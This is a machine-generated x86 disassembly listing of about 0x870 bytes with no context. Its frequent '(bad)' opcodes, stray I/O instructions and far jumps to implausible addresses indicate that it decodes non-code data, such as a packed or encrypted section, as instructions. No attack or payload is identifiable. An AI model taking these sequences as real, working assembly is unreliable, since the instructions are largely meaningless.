  407c7b:	add    BYTE PTR [eax],al
  407c7d:	jo     0x407c84
  407c7f:	jne    0x407c67
  407c81:	int    0x6
  407c83:	add    cl,ch
  407c85:	pusha  
  407c86:	mov    al,ds:0x811e4202
  407c8b:	ret    
  407c8c:	(bad)  
  407c8d:	xchg   ebp,eax
  407c8e:	mov    esi,0x5260edc2
  407c93:	mov    eax,DWORD PTR ds:0xff4c1df
  407c99:	shr    DWORD PTR [edi+edi*8-0x71537900],1
  407ca0:	test   esi,esi
  407ca2:	jne    0x407ca3
  407ca4:	inc    DWORD PTR [ebp+0x7d]
  407ca7:	clc    
  407ca8:	(bad)  
  407ca9:	std    
  407caa:	jbe    0x407cac
  407cac:	add    dl,bh
  407cae:	or     bh,al
  407cb0:	test   DWORD PTR [esi-0x34000089],edi
  407cb6:	or     BYTE PTR [eax],al
  407cb8:	add    BYTE PTR [edi],ch
  407cba:	test   BYTE PTR [eax],al
  407cbc:	call   FWORD PTR [ebp-0x4d8a008a]
  407cc2:	test   DWORD PTR [eax],eax
  407cc4:	lea    eax,[edi+0x6d]
  407cc7:	(bad)  
  407cc8:	(bad)  
  407cc9:	std    
  407cca:	push   ecx
  407ccb:	push   0x0
  407ccd:	push   eax
  407cce:	add    DWORD PTR [ebp-0x88017b],ecx
  407cd4:	call   FWORD PTR [edx+0xb]
  407cd7:	add    al,ch
  407cd9:	outs   dx,BYTE PTR ds:[esi]
  407cda:	sbb    DWORD PTR [eax],eax
  407cdc:	add    cl,bh
  407cde:	pop    eax
  407cdf:	push   DWORD PTR [eax+eax*1+0x0]
	...
  407cef:	add    BYTE PTR [esi-0x798a4057],al
  407cf5:	mov    cl,0xbf
  407cf7:	jmp    0x407c80
  407cf9:	and    BYTE PTR [ecx],al
  407cfb:	add    BYTE PTR [edx+0x8],bh
  407cfe:	leave  
  407cff:	ret    0x852
  407d02:	push   ebp
  407d03:	mov    ebx,DWORD PTR [esi+0x9fcc482]
  407d09:	leave  
  407d0a:	fisubr DWORD PTR [edx+0x0]
  407d0d:	jne    0x407d84
  407d0f:	or     BYTE PTR [edx+0x6dffff2c],dl
  407d15:	stos   BYTE PTR es:[edi],al
  407d16:	mov    edi,0x5a09d674
  407d1b:	inc    edi
  407d1d:	scas   eax,DWORD PTR es:[edi]
  407d1e:	out    0x7f,eax
  407d20:	jge    0x407d98
  407d22:	dec    DWORD PTR [ebx]
  407d24:	arpl   si,bx
  407d26:	ss add bh,al
  407d29:	popa   
  407d2a:	sbb    eax,0x7e9d7900
  407d2f:	inc    ebp
  407d30:	cld    
  407d31:	lea    esi,[eax+0x7066b75]
  407d37:	mov    eax,0xc0869e63
  407d3c:	gs push cs
  407d3e:	jge    0x407d85
  407d40:	ja     0x407d28
  407d42:	inc    esi
  407d43:	dec    DWORD PTR [esi-0x60]
  407d46:	je     0x407d49
  407d48:	fdiv   st,st(0)
  407d4a:	dec    DWORD PTR [edx+0x6a045871]
  407d50:	bound  ebx,QWORD PTR [ecx]
  407d52:	inc    esi
  407d53:	inc    DWORD PTR [eax]
	...
  407d61:	add    BYTE PTR [eax],al
  407d63:	adc    esi,DWORD PTR [ebx+0x36]
  407d66:	or     al,0xac
  407d68:	unpcklps xmm7,xmm7
  407d6b:	cs mov dl,0x9b
  407d6e:	mov    eax,0x3bb08abf
  407d73:	push   ds
  407d74:	scas   al,BYTE PTR es:[edi]
  407d75:	xor    eax,0x86a17802
  407d7a:	fisttp DWORD PTR [edi]
  407d7c:	push   edx
  407d7d:	jl     0x407d42
  407d7f:	sbb    BYTE PTR [ebp-0x3b],dh
  407d82:	adc    al,0x63
  407d84:	or     DWORD PTR [ebp-0x14],edi
  407d87:	loop   0x407dea
  407d89:	add    edi,eax
  407d8b:	and    dl,BYTE PTR fs:[ebx+ebp*1+0x38]
  407d90:	xlat   BYTE PTR ds:[ebx]
  407d91:	dec    ebp
  407d92:	dec    esi
  407d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d95:	fwait
  407d96:	sbb    BYTE PTR [esp+edi*1-0x50],cl
  407d9a:	or     esp,DWORD PTR [ebx]
  407d9c:	imul   ebp,DWORD PTR [eax],0x35eb996a
  407da2:	or     BYTE PTR [ebx-0x59],cl
  407da5:	mov    al,0xff
  407da7:	sub    al,0xa8
  407da9:	ret    
  407daa:	jne    0x407e0d
  407dac:	add    eax,0x28e25812
  407db1:	stc    
  407db2:	add    ebp,DWORD PTR [ebx+0x5]
  407db5:	jmp    0xe9ade1f3
  407dba:	sti    
  407dbb:	add    al,0xab
  407dbd:	adc    al,BYTE PTR [eax+ebp*8]
  407dc0:	inc    eax
  407dc1:	fstp   DWORD PTR ds:0x86645563
	...
  407dd3:	add    BYTE PTR [eax],al
  407dd5:	add    BYTE PTR [ebx-0x53],ah
  407dd8:	out    dx,al
  407dd9:	scas   eax,DWORD PTR es:[edi]
  407dda:	xchg   ebx,eax
  407ddb:	stos   BYTE PTR es:[edi],al
  407ddc:	pop    esp
  407ddd:	cld    
  407dde:	les    ebp,FWORD PTR [esi]
  407de0:	xchg   esi,eax
  407de1:	add    al,0x63
  407de3:	sub    BYTE PTR [ecx-0x2619ed3],0x38
  407dea:	pusha  
  407deb:	inc    esi
  407dec:	shl    bh,cl
  407dee:	sub    al,0x7e
  407df0:	adc    al,0x0
  407df2:	call   0x1344c10e
  407df7:	js     0x407e5d
  407df9:	add    al,0xab
  407dfb:	stos   BYTE PTR es:[edi],al
  407dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dfd:	push   esp
  407dfe:	pushf  
  407dff:	xor    ch,ch
  407e01:	scas   al,BYTE PTR es:[edi]
  407e02:	xor    DWORD PTR ds:0x1527dd31,edx
  407e08:	push   0x31
  407e0a:	jae    0x407e11
  407e0c:	cld    
  407e0d:	add    ah,BYTE PTR [eax]
  407e0f:	sahf   
  407e10:	in     eax,0x88
  407e12:	cwde   
  407e13:	xor    DWORD PTR [eax+0x7b],edx
  407e16:	mov    al,ds:0x57c2a04e
  407e1b:	add    eax,0x864f7abc
  407e20:	and    eax,0x55f6acac
  407e25:	sbb    ah,BYTE PTR [ebx+0x52]
  407e28:	dec    esi
  407e29:	cmp    DWORD PTR [ebx-0x63],ebx
  407e2c:	sbb    cl,bl
  407e2e:	cmp    al,0xaa
  407e30:	es dec ecx
  407e32:	aaa    
  407e33:	add    eax,0x560e900
  407e38:	mov    edx,DWORD PTR [eax+eax*1+0x0]
	...
  407e47:	add    BYTE PTR [eax],al
  407e49:	sub    BYTE PTR [edi+0x12],bh
  407e4c:	je     0x407df8
  407e4e:	lods   eax,DWORD PTR ds:[esi]
  407e4f:	push   eax
  407e50:	xchg   ebx,eax
  407e51:	pop    esp
  407e52:	js     0x407e99
  407e54:	adc    eax,0xe175aab7
  407e59:	mov    ch,0x56
  407e5b:	or     al,0xae
  407e5d:	out    0x27,eax
  407e5f:	cld    
  407e60:	in     al,dx
  407e61:	cli    
  407e62:	clc    
  407e63:	or     DWORD PTR [ebp-0x16],edi
  407e66:	xchg   BYTE PTR [ebp-0xf],bh
  407e69:	pusha  
  407e6a:	xor    cl,cl
  407e6c:	sbb    ah,BYTE PTR [edi-0x628dfa63]
  407e72:	test   eax,eax
  407e74:	jmp    0x5060:0xe5c2bc1d
  407e7b:	mov    edx,ebp
  407e7d:	loope  0x407e3f
  407e7f:	hlt    
  407e80:	sbb    cl,BYTE PTR [ebx*1+0x560f398]
  407e87:	call   0xffea7b6a
  407e8c:	jo     0x407eb9
  407e8e:	test   eax,0x54db248d
  407e93:	call   0xffea186d
  407e98:	ficomp DWORD PTR [ecx+0x79131e1e]
  407e9e:	and    DWORD PTR [eax],eax
  407ea0:	and    DWORD PTR [eax+0x5],0xffffffff
  407ea4:	cld    
  407ea5:	mov    ah,0xa9
  407ea7:	jne    0x407e8a
  407ea9:	enter  0xfe80,0x66
	...
  407eb9:	add    BYTE PTR [eax],al
  407ebb:	add    BYTE PTR ds:0xdceec083,cl
  407ec1:	cmc    
  407ec2:	add    cl,ch
  407ec4:	pusha  
  407ec5:	test   al,0x75
  407ec7:	push   ebp
  407ec8:	call   0xa5415a46
  407ecd:	push   edi
  407ece:	cmp    eax,0x4a000
  407ed3:	jbe    0x407f14
  407ed5:	mov    bl,BYTE PTR [ecx+eax*1]
  407ed8:	cmp    al,BYTE PTR ds:0x8c7e75ff
  407ede:	pop    edx
  407edf:	push   DWORD PTR [ebp+0x57]
  407ee2:	test   eax,eax
  407ee4:	out    dx,al
  407ee5:	sar    bh,0x75
  407ee8:	outs   dx,BYTE PTR ds:[esi]
  407ee9:	mov    WORD PTR [ebp-0x74a89a23],cs
  407eef:	push   ebp
  407ef0:	out    dx,al
  407ef1:	adc    ch,BYTE PTR cs:[edx-0x6]
  407ef5:	or     al,0x34
  407ef7:	and    edx,edi
  407ef9:	add    al,0xff
  407efb:	jne    0x407ec3
  407efd:	pop    edx
  407efe:	jne    0x407ef4
  407f00:	mov    ch,0x53
  407f02:	or     al,0xc7
  407f04:	jg     0x407f5f
  407f06:	add    BYTE PTR [eax],al
  407f08:	mov    edx,0x51ce6804
  407f0d:	inc    esp
  407f0e:	add    bh,bh
  407f10:	outs   dx,DWORD PTR ds:[esi]
  407f11:	jne    0x407efb
  407f13:	sbb    DWORD PTR [ecx+eax*1],ebp
  407f16:	add    BYTE PTR [ebx-0x3f],dl
  407f19:	les    esi,FWORD PTR [esi+esi*1+0x11]
  407f1d:	pop    ecx
  407f1e:	push   0xce
	...
  407f2f:	mov    cl,0x43
  407f31:	add    al,ch
  407f33:	push   0x2d
  407f35:	add    BYTE PTR [eax],al
  407f37:	jns    0x407f95
  407f39:	push   edi
  407f3a:	inc    edi
  407f3b:	icebp  
  407f3c:	mov    ecx,0x49b94b9
  407f41:	add    BYTE PTR [eax-0x47518979],dh
  407f47:	push   cs
  407f48:	adc    al,0x0
  407f4a:	add    BYTE PTR [ecx-0x3c],dh
  407f4d:	mov    BYTE PTR [edi-0x4b],0x1
  407f51:	push   edi
  407f52:	push   ebx
  407f53:	arpl   WORD PTR [esi-0x4f],ax
  407f56:	mov    ch,0x63
  407f58:	sahf   
  407f59:	jp     0x407fa0
  407f5b:	cmp    ebx,DWORD PTR [edi-0x3b]
  407f5e:	inc    edi
  407f5f:	xor    al,0x99
  407f61:	dec    esp
  407f62:	pop    ebx
  407f63:	mov    ebx,0x6340d910
  407f68:	xlat   BYTE PTR ds:[ebx]
  407f69:	ss cld 
  407f6b:	or     ebp,esi
  407f6d:	jbe    0x407f6f
  407f6f:	arpl   WORD PTR [ebx-0x8],bp
  407f72:	mov    edi,0xf8785a97
  407f77:	jnp    0x407f51
  407f79:	fadd   DWORD PTR [eax+0x63]
  407f7c:	push   ss
  407f7d:	in     eax,0xb3
  407f7f:	arpl   WORD PTR [esi+0x5794f800],bx
  407f85:	js     0x407f66
  407f87:	stos   BYTE PTR es:[edi],al
  407f88:	push   ecx
  407f89:	adc    eax,DWORD PTR [eax]
  407f8b:	arpl   WORD PTR [esi+0x6605f1fe],cx
  407f91:	xchg   edi,eax
  407f92:	adc    DWORD PTR [eax],eax
	...
  407fa0:	add    BYTE PTR [eax],al
  407fa2:	arpl   WORD PTR [esi-0x21623f28],bx
  407fa8:	lods   al,BYTE PTR ds:[esi]
  407fa9:	add    BYTE PTR [ebx+ecx*1],dl
  407fac:	pushf  
  407fad:	addr16 mov cl,0x66
  407fb0:	lods   al,BYTE PTR ds:[esi]
  407fb1:	mov    edx,DWORD PTR [esi]
  407fb3:	into   
  407fb4:	clc    
  407fb5:	shr    DWORD PTR [edi],1
  407fb7:	mov    ds:0x9788027a,al
  407fbc:	push   ebx
  407fbd:	call   0xffecfb54
  407fc2:	sub    al,0x58
  407fc4:	inc    esp
  407fc5:	call   DWORD PTR [esi-0x29]
  407fc8:	dec    eax
  407fc9:	push   esi
  407fcb:	sub    DWORD PTR [ebx-0x53d969db],ebx
  407fd1:	sub    esi,0x35
  407fd4:	add    esi,DWORD PTR [edi+0x5c]
  407fd7:	pop    edi
  407fd8:	inc    esi
  407fd9:	clc    
  407fda:	arpl   WORD PTR ds:0xa66363e9,ax
  407fe0:	aam    0xab
  407fe2:	dec    esp
  407fe3:	xor    DWORD PTR [ebp-0x54],ebx
  407fe6:	into   
  407fe7:	std    
  407fe8:	inc    eax
  407fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fec:	inc    esi
  407fed:	lods   al,BYTE PTR ds:[esi]
  407fee:	scas   al,BYTE PTR es:[edi]
  407fef:	mov    cl,0x51
  407ff1:	xchg   BYTE PTR [ecx],cl
  407ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ff4:	ss clc 
  407ff6:	in     al,0x30
  407ff8:	jmp    0x407f92
  407ffa:	js     0x407ff6
  407ffc:	sub    BYTE PTR [edi],dh
  407ffe:	ins    BYTE PTR es:[edi],dx
  407fff:	jp     0x407fb5
  408001:	mov    bh,0xd8
  408003:	adc    edx,DWORD PTR [esi]
  408005:	add    BYTE PTR ss:[eax],al
	...
  408014:	add    BYTE PTR [edi-0x5a],dl
  408017:	xchg   esp,eax
  408018:	mov    bh,0xfc
  40801a:	push   ebx
  40801b:	mov    ebp,0xe42e2386
  408020:	push   0x3e90562
  408025:	fcom   DWORD PTR [eax-0xb]
  408028:	ja     0x40809b
  40802a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40802b:	pop    esp
  40802c:	mov    al,0xd4
  40802e:	push   ebx
  40802f:	icebp  
  408030:	stos   BYTE PTR es:[edi],al
  408031:	push   esi
  408032:	test   eax,0xa6c17fc1
  408037:	into   
  408038:	jg     0x407fda
  40803a:	inc    esi
  40803b:	and    bh,BYTE PTR [ebp+0x50e8f9a1]
  408041:	fcomp  DWORD PTR [ecx+0x4ef3c06a]
  408047:	sbb    bl,bh
  408049:	mov    ecx,0x94e3e91d
  40804e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40804f:	xchg   ecx,eax
  408050:	add    BYTE PTR [ecx+0x1e7d96a6],0xa9
  408057:	add    DWORD PTR [ebx+eax*2],eax
  40805a:	add    eax,0xa2fa9be9
  40805f:	jle    0x40800c
  408061:	fiadd  DWORD PTR [eax+0x0]
  408064:	cmp    eax,0xe9200547
  408069:	pusha  
  40806a:	popf   
  40806b:	ins    BYTE PTR es:[edi],dx
  40806c:	dec    ebx
  40806d:	or     BYTE PTR [esi+0x78c4a489],ah
  408073:	jge    0x40809e
  408075:	mov    dh,0xe9
  408077:	(bad)  
  408078:	call   0x40807d
	...
  408085:	add    BYTE PTR [eax],al
  408087:	add    BYTE PTR [eax-0xe],ah
  40808a:	mov    edi,0x45be953a
  40808f:	sub    DWORD PTR [ebx],edi
  408091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408092:	(bad)  
  408093:	jmp    0x2f14c0b9
  408098:	push   0xa22e0005
  40809d:	mov    ch,0xff
  40809f:	(bad)  
  4080a0:	pusha  
  4080a1:	add    eax,0x75bc9cff
  4080a6:	inc    ebp
  4080a7:	cmp    eax,ecx
  4080a9:	das    
  4080aa:	mov    ah,0x76
  4080ac:	mov    ds:0x20a48d99,al
  4080b1:	push   ebp
  4080b2:	push   0x800560e9
  4080b7:	and    DWORD PTR [eax-0x5a],0x75
  4080bb:	icebp  
  4080bc:	clc    
  4080bd:	bound  esi,QWORD PTR [ecx+ebp*8+0x5dbffa60]
  4080c4:	popa   
  4080c5:	cmp    BYTE PTR [ebp-0x47],0x60
  4080c9:	xor    BYTE PTR ds:0x4fad0,al
  4080cf:	jmp    0xb6f0c075
  4080d4:	pop    ecx
  4080d5:	add    eax,0x75235c00
  4080da:	push   eax
  4080db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080dc:	push   ebx
  4080dd:	imul   ebp,DWORD PTR [eax-0x17],0x64800560
  4080e4:	and    eax,ebp
  4080e6:	push   eax
  4080e7:	or     DWORD PTR [ebx+0x71],0x0
	...
  4080fa:	add    BYTE PTR [edx-0x788a405a],cl
  408100:	mov    BYTE PTR [ecx-0x74fe8600],ch
  408106:	inc    ebp
  408107:	xchg   esi,eax
  408108:	mov    BYTE PTR [eax],0x0
  40810b:	iret   
  40810c:	in     eax,dx
  40810d:	mov    edi,0x96eb9
  408112:	add    BYTE PTR [ecx-0x37],ch
  408115:	rep stos BYTE PTR es:[edi],al
  408117:	test   DWORD PTR [ebp-0x40],eax
  40811a:	cmp    al,0x4a
  40811c:	or     DWORD PTR [eax],eax
  40811e:	push   edi
  408120:	xor    al,0x8f
  408122:	inc    ebp
  408123:	sahf   
  408124:	mov    DWORD PTR [ebp-0x2c],0xf4d
  40812b:	inc    ebp
  40812c:	inc    ebp
  40812d:	lock dec DWORD PTR ds:0xb78d0009
  408134:	enter  0x6a50,0xa
  408138:	add    eax,DWORD PTR [eax]
  40813a:	push   DWORD PTR [edi+0x2c]
  40813d:	call   0x48b773
  408142:	or     edi,DWORD PTR [edx]
  408144:	hlt    
  408145:	add    eax,0xb84f83
  40814a:	jne    0x408114
  40814c:	and    DWORD PTR [eax-0x1],0x75ff6d37
  408153:	out    0x1,al
  408155:	call   0xff4a0c85
  40815a:	jne    0x40813a
  40815c:	or     edx,0xb3
	...
  40816e:	mov    edx,0x8ac48308
  408173:	popf   
  408174:	mov    dh,0x45
  408176:	repnz cmp DWORD PTR [edx+0x0],ebp
  40817a:	mov    ebp,0xdce8fbf4
  40817f:	jae    0x408180
  408181:	jmp    DWORD PTR [ebx-0x59]
  408184:	ret    
  408185:	jne    0x4081e8
  408187:	xchg   edi,ebp
  408189:	mov    BYTE PTR [esi],bl
  40818b:	inc    esi
  40818c:	test   eax,0x2576af75
  408191:	mov    dl,0x63
  408193:	scas   al,BYTE PTR es:[edi]
  408194:	push   ebx
  408195:	call   esi
  408197:	repnz test al,0x75
  40819a:	sbb    esi,DWORD PTR [esi]
  40819c:	dec    edi
  40819d:	sti    
  40819e:	dec    esp
  40819f:	inc    ebx
  4081a0:	std    
  4081a1:	mov    edi,0x109cb0ce
  4081a6:	cmp    al,0xb9
  4081a8:	adc    edi,edi
  4081aa:	scas   al,BYTE PTR es:[edi]
  4081ab:	call   0xfcef:0x35eb75a8
  4081b2:	and    al,0xdb
  4081b4:	jl     0x40818e
  4081b6:	sbb    al,0x59
  4081b8:	imul   ebp,eax,0x66
  4081bb:	inc    edx
  4081bc:	add    al,0x0
  4081be:	or     al,0x79
  4081c0:	outs   dx,DWORD PTR ds:[esi]
  4081c1:	call   0xffe98efc
  4081c6:	cld    
  4081c7:	js     0x408230
  4081c9:	call   0xffe98f0c
  4081ce:	in     al,dx
  4081cf:	sbb    BYTE PTR [edi+0xe8],ah
	...
  4081e1:	inc    esi
  4081e2:	or     eax,0xeee8ffa9
  4081e7:	dec    esp
  4081e8:	pop    edi
  4081e9:	stos   BYTE PTR es:[edi],al
  4081ea:	outs   dx,DWORD PTR ds:[esi]
  4081eb:	idiv   edi
  4081ed:	aaa    
  4081ee:	pop    ss
  4081ef:	xchg   edi,eax
  4081f0:	sbb    DWORD PTR [edi+0x6f457cb9],0xffffffa7
  4081f7:	ret    
  4081f8:	je     0x408257
  4081fa:	jae    0x4081ff
  4081fc:	add    BYTE PTR [ebx-0x52],ah
  4081ff:	add    eax,edi
  408201:	push   ds
  408202:	pop    edx
  408203:	add    eax,DWORD PTR [eax]
  408205:	arpl   WORD PTR [esi+0x4974576],bp
  40820b:	cmp    DWORD PTR [ecx+0x2e9e1116],ebp
  408211:	pop    ebx
  408212:	lods   eax,DWORD PTR ds:[esi]
  408213:	add    BYTE PTR [edx+0x266aa37c],ch
  408219:	ja     0x40821f
  40821b:	std    
  40821c:	adc    cl,bh
  40821e:	add    al,0x7e
  408220:	cs push edi
  408222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408223:	cld    
  408224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408225:	dec    ebx
  408226:	cmp    al,0x6f
  408228:	test   al,0x54
  40822a:	ss cs dec di
  40822e:	scas   al,BYTE PTR es:[edi]
  40822f:	cmp    DWORD PTR [ebx-0x454e5cbc],esp
  408235:	and    DWORD PTR [esi],ecx
  408237:	jmp    0x6af26a8a
  40823c:	mov    edi,0x3e262c2f
  408241:	daa    
  408242:	add    eax,0x21e9
	...
  408253:	add    BYTE PTR [ecx+ecx*2],ah
  408256:	das    
  408257:	or     DWORD PTR [ebx+0x2f],esp
  40825a:	in     eax,dx
  40825b:	jbe    0x408203
  40825d:	mov    eax,ds:0x5e31bb9
  408262:	jmp    0xee30d6a
  408267:	add    esp,DWORD PTR [ebx-0x5e]
  40826a:	jl     0x408267
  40826c:	add    al,0x75
  40826e:	cmp    al,BYTE PTR [ebx]
  408270:	arpl   sp,cx
  408272:	sub    edi,edi
  408274:	fdivr  QWORD PTR [ecx]
  408276:	bound  edx,QWORD PTR [edi+0x4f95c9e0]
  40827c:	xor    dl,cl
  40827e:	and    al,0x58
  408280:	arpl   WORD PTR ds:0xbe7003e9,ax
  408286:	inc    ecx
  408287:	add    al,0x53
  408289:	add    eax,0xa5ca9be9
  40828e:	mov    esi,0x48daa7
  408293:	test   eax,0xe910057f
  408298:	pusha  
  408299:	lods   eax,DWORD PTR ds:[esi]
  40829a:	mov    WORD PTR [ecx+0x2489a2c4],cs
  4082a0:	imul   DWORD PTR [eax+eax*1]
  4082a3:	stc    
  4082a4:	pusha  
  4082a5:	add    eax,0xa2bf0ee8
  4082aa:	push   DWORD PTR [eax+0x22]
  4082ad:	popa   
  4082ae:	(bad)  
  4082af:	cld    
  4082b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082b1:	pop    esp
  4082b2:	cmp    al,0xe9
  4082b4:	pusha  
  4082b5:	add    eax,0xa933
	...
  4082c6:	add    BYTE PTR [eax],dl
  4082c8:	outs   dx,DWORD PTR ds:[esi]
  4082c9:	(bad)  
  4082ca:	lods   al,BYTE PTR ds:[esi]
  4082cb:	or     al,0xe1
  4082cd:	(bad)  
  4082ce:	call   0x29b62533
  4082d3:	mov    ah,0x48
  4082d5:	aam    0x4e
  4082d7:	jb     0x408336
  4082d9:	(bad)  
  4082da:	lods   al,BYTE PTR ds:[esi]
  4082db:	lock leave 
  4082dd:	inc    ebp
  4082de:	and    esp,edi
  4082e0:	adc    DWORD PTR [eax],eax
  4082e2:	jmp    0x2f34cac4
  4082e7:	or     al,0xa2
  4082e9:	push   DWORD PTR [edx+eiz*4-0x37]
  4082ed:	push   eax
  4082ee:	xchg   ecx,eax
  4082ef:	pusha  
  4082f0:	add    eax,0x5596900
  4082f5:	call   DWORD PTR [eax+edi*8+0x673bb5a9]
  4082fc:	add    eax,0xb33290b
  408301:	xor    DWORD PTR [esp+ebp*4+0x4],0x75
  408306:	in     al,0xf7
  408308:	lahf   
  408309:	add    cl,ch
  40830b:	pusha  
  40830c:	retf   0x9945
  40830f:	std    
  408310:	adc    DWORD PTR [eax],eax
  408312:	jmp    0x39f0cb52
  408317:	cld    
  408318:	pop    ss
  408319:	mov    esp,0x91200
  40831e:	add    BYTE PTR [edx],bh
  408320:	sbb    eax,0x817ac445
  408325:	nop
  408326:	mov    dl,0x8a
  408328:	add    eax,0xc00b
	...
  408339:	add    BYTE PTR [edi+0x4],ch
  40833c:	jmp    0x45fe19
  408341:	mov    ecx,DWORD PTR [edi+0x31]
  408344:	mov    BYTE PTR [eax],0x8a
  408347:	sbb    al,0x7d
  408349:	les    esp,FWORD PTR [ebx]
  40834b:	stos   BYTE PTR es:[edi],al
  40834c:	(bad)  
  40834d:	(bad)  
  40834e:	jp     0x4082e6
  408350:	mov    edi,0x455fa0f3
  408355:	les    eax,FWORD PTR [esi]
  408357:	add    eax,0xd5c50000
  40835c:	mov    bh,0x8f
  40835e:	call   DWORD PTR [edi+eax*8+0x45]
  408362:	jb     0x4083cb
  408364:	str    WORD PTR [edx+0x60]
  408368:	inc    ebp
  408369:	hlt    
  40836a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40836b:	xchg   edi,eax
  40836c:	(bad)  
  40836d:	push   DWORD PTR [edi+0x2050c445]
  408373:	add    eax,0xd545006a
  408378:	mov    ebx,0x16bee8
  40837d:	add    BYTE PTR [ecx],dl
  40837f:	lds    esi,FWORD PTR [esi+eax*1-0x77]
  408383:	in     eax,dx
  408384:	rol    DWORD PTR [eax],cl
  408386:	iret   
  408387:	add    eax,0x4fa8ce9
  40838c:	add    bh,bh
  40838e:	outs   dx,DWORD PTR ds:[esi]
  40838f:	hlt    
  408390:	(bad)  
  408391:	jne    0x40831d
  408393:	addr16 jne 0x40834e
  408396:	loop   0x408366
  408398:	sub    al,BYTE PTR [ecx-0x46]
  40839b:	imul   esi,DWORD PTR [ebp-0x44],0x0
	...
  4083aa:	add    BYTE PTR [eax],al
  4083ac:	add    BYTE PTR [edx+0x6300b1d2],dh
  4083b2:	scas   al,BYTE PTR es:[edi]
  4083b3:	add    ah,0x4f
  4083b6:	mov    edi,0xfe8f456c
  4083bb:	sbb    DWORD PTR [eax],eax
  4083bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083be:	fld    st(3)
  4083c0:	call   0xffe5da5d
  4083c5:	push   0x78022f6e
  4083ca:	dec    eax
  4083cb:	jnp    0x408412
  4083cd:	iret   
  4083ce:	jg     0x4083ff
  4083d0:	mov    ah,0x8b
  4083d2:	dec    ebp
  4083d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083d4:	push   DWORD PTR [edi+ecx*4+0x2f]
  4083d8:	mov    esp,0x73f67b
  4083dd:	arpl   si,di
  4083df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083e0:	jne    0x408401
  4083e2:	pop    ss
  4083e3:	das    
  4083e4:	mov    ah,0x4b
  4083e6:	hlt    
  4083e7:	stos   BYTE PTR es:[edi],al
  4083e8:	dec    DWORD PTR [ebx+edx*4-0x3d]
  4083ec:	jne    0x40844f
  4083ee:	xor    esi,ebx
  4083f0:	cmp    BYTE PTR [esi+0x4f74039e],0x4f
  4083f7:	das    
  4083f8:	adc    BYTE PTR [ecx+eiz*2],ch
  4083fb:	idiv   esi
  4083fd:	scas   al,BYTE PTR es:[edi]
  4083fe:	sbb    bl,BYTE PTR [eax+eax*2+0xba4d71a]
  408405:	and    ebx,DWORD PTR [ecx+0x1]
  408408:	jmp    0x40847e
  40840a:	adc    ecx,esp
  40840c:	or     ebp,DWORD PTR [eax]
  40840e:	jp     0x408422
  408410:	lea    eax,[eax]
	...
  40841e:	add    BYTE PTR [eax],al
  408420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408421:	dec    edx
  408422:	push   esp
  408423:	jmp    FWORD PTR [esi-0x66]
  408426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408427:	jne    0x4083e0
  408429:	cmc    
  40842a:	or     bh,bl
  40842c:	in     al,0x9e
  40842e:	js     0x408408
  408430:	fsub   QWORD PTR [eax]
  408432:	outs   dx,DWORD PTR ds:[esi]
  408433:	call   0x44610a
  408438:	int3   
  408439:	add    al,0x5c
  40843b:	les    edi,FWORD PTR [ebx-0x435b420b]
  408441:	lahf   
  408442:	pop    esp
  408443:	push   0xa4ae0dcb
  408448:	lods   al,BYTE PTR ds:[esi]
  408449:	lahf   
  40844a:	cmp    al,0x6c
  40844c:	mov    ebx,0x9ca49e05
  408451:	xor    DWORD PTR [eax+ebx*2],0x63
  408455:	sbb    ecx,esp
  408457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408458:	push   ss
  408459:	jno    0x4083ec
  40845b:	mov    al,0xa5
  40845d:	lahf   
  40845e:	sahf   
  40845f:	js     0x408401
  408461:	cmp    esi,DWORD PTR [esi]
  408463:	mov    ebx,0x4ee8f4a1
  408468:	fdiv   DWORD PTR [eax+0x336bbf6a]
  40846e:	ror    al,cl
  408470:	loopne 0x408492
  408472:	in     eax,0x3
  408474:	iret   
  408475:	dec    edi
  408476:	push   0x26
  408478:	jae    0x40847f
  40847a:	fnstsw WORD PTR [ebx]
  40847c:	(bad)  
  40847d:	dec    eax
  40847e:	pop    ebp
  40847f:	push   ebx
  408480:	cmp    al,0x19
  408482:	in     eax,0x9b
	...
  408490:	add    BYTE PTR [eax],al
  408492:	add    BYTE PTR [edi],ch
  408494:	push   esi
  408495:	jmp    0xc2066a9d
  40849a:	repz and eax,0xe79bed19
  4084a0:	mov    bh,0x36
  4084a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084a3:	jmp    0x11a1:0x96a43148
  4084aa:	data16 mov ah,0x5
  4084ad:	jmp    0xf05a41aa
  4084b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084b3:	outs   dx,BYTE PTR ds:[esi]
  4084b4:	cmc    
  4084b5:	or     eax,0x635eb2e
  4084ba:	cs pop ebx
  4084bc:	lods   eax,DWORD PTR ds:[esi]
  4084bd:	jmp    0xa862:0x9edca5
  4084c4:	sahf   
  4084c5:	jne    0x4084b4
  4084c7:	jmp    0x612a3433
  4084cc:	sahf   
  4084cd:	jne    0x4084bc
  4084cf:	or     BYTE PTR [esi],bh
  4084d1:	fcom   st(6)
  4084d3:	add    BYTE PTR [ebx-0x3c61cd3d],cl
  4084d9:	or     al,0xe9
  4084db:	imul   ecx,DWORD PTR [edx+0x15ab68ec],0xfffffffe
  4084e2:	mov    dh,0xc0
  4084e4:	nop
  4084e5:	test   DWORD PTR [ebx],edi
  4084e7:	rcr    DWORD PTR [esi+0x43739ff],0x1
  4084ee:	jmp    0x58a43253
  4084f3:	pop    edi
